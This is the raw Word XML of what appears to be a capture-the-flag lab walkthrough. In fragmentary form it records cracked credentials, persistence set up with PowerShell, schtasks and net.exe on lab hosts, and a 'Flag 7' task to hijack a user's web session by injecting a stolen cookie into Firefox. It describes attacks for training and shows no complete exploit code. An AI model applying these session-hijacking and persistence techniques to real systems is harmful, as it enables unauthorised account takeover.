        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1637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\\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17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2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.31.1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.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12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\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x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y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\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x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y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\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01-05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-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25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.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synci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UE3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1637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cked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ntial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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="378" w:lineRule="auto"/>
        <w:ind w:left="1637" w:right="8882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moo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/ letme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n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min /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swo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d</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:spacing w:before="2" w:line="378" w:lineRule="auto"/>
        <w:ind w:left="1637" w:right="6132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pict>
          <v:group id="_x0000_s1077" style="position:absolute;left:0;text-align:left;margin-left:74.3pt;margin-top:256.05pt;width:457.25pt;height:457.95pt;z-index:-1882;mso-position-horizontal-relative:page;mso-position-vertical-relative:page" coordorigin="1486,5121" coordsize="9145,9159">
            <v:shape id="_x0000_s1078" style="position:absolute;left:1486;top:5121;width:9145;height:9159" coordorigin="1486,5121" coordsize="9145,9159" path="m1486,14280r9145,l10631,5121r-9145,l1486,14280xe" filled="f">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page" anchory="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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ech</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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/</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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FL</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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A</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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G</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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{</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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 w:rsidR="00A76861"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c</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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h_p</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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a</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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ss</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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w</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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ord_</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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c</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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a</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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ck</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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 w:rsidR="00A76861"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}   </w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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#</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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FLA</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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G</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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4 clue /</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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p</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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s</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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s_</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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h</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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e_</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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h</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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s</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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h_</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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_</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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 w:rsidR="00A76861"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a</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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a        </w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="43"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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#CLU</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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E</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1637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’s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Ma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’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wo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v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so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ot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een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ck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,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ut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w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v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e their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</w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1637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We pa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’s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as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 get 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nd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pt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172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.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31.1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.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14</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1637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We u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ed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oL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(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we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hell,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sks,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net.e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x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e) to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create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pe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-4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siste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ce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 1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72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.31.1.14</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1637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ersisten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e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hell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ent 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wi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-4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G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5, C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UE5,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br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crumb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liste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er</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1637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FLA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G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5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- FL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G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{pe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_pay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_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}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1637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UE5: If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nni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’s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w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ng,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hen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nn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e’s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log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g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ng.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Fi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ev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ote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nd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tr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ce the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cook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</w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="24"/>
        <w:ind w:left="1637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tr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il.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="378" w:lineRule="auto"/>
        <w:ind w:left="1637" w:right="3445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We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si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/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nie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_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s.p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p co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FA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G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6, CLU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6,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4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me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br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umb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s.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FLA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G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6 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r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mly-gen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ed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umber</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1637"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:headerReference w:type="default" r:id="rId38"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="696" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pP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UE6 –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Ma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nie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’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okie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is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ore </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-4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 ju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2"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>k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.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it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 y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ur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ow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er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ep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g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ht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in.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>Flag 7 –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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve">h </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>n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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>i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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve">, You </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>S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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>o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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>ldn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>’</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>t Have!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pP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O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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>b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je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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>t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i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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>v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e</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="264" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="1201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Hija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k a legitimate u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er's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 xml:space="preserve"> w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eb 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ion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us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4"/>
          <w:szCs w:val="24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ng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th</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3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ir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tolen authenti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at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on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ookie.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a re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tr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ic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ted admi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istrat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ve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p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age to retrieve the final flag and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mp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lete the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hallen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g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e.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>T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o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>o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ls &amp; T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>hn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iqu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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e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 xml:space="preserve">s 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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Y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ou’</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>l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 xml:space="preserve">l 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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>U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se</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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Fire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 xml:space="preserve">x – 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y in</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>j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oki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 xml:space="preserve">into </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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 xml:space="preserve">he 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br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w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ser</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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se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sion</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="51"/>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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si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n Hij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 xml:space="preserve">cking – </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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 xml:space="preserve">o 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cc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tr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ic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ed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pag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sing</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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 xml:space="preserve">en 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kie</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="54"/>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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nu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spacing w:val="-3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w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sing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 xml:space="preserve">– </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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 xml:space="preserve">o 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spacing w:val="-3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ul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 xml:space="preserve">e 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al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 xml:space="preserve">-world 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-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omi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s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="18" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pP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S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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>t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ep-b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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>y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-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>S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 xml:space="preserve">tep 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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>In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st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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>u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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c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t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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i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ons</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="14" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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1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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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Pre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>p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 xml:space="preserve">are the Cookie for </w:t>
      </w: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U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e</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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 t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e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br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ow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er.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="21"/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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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etu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n to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K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li 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e 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he text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 wi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nnie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’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v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okie.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
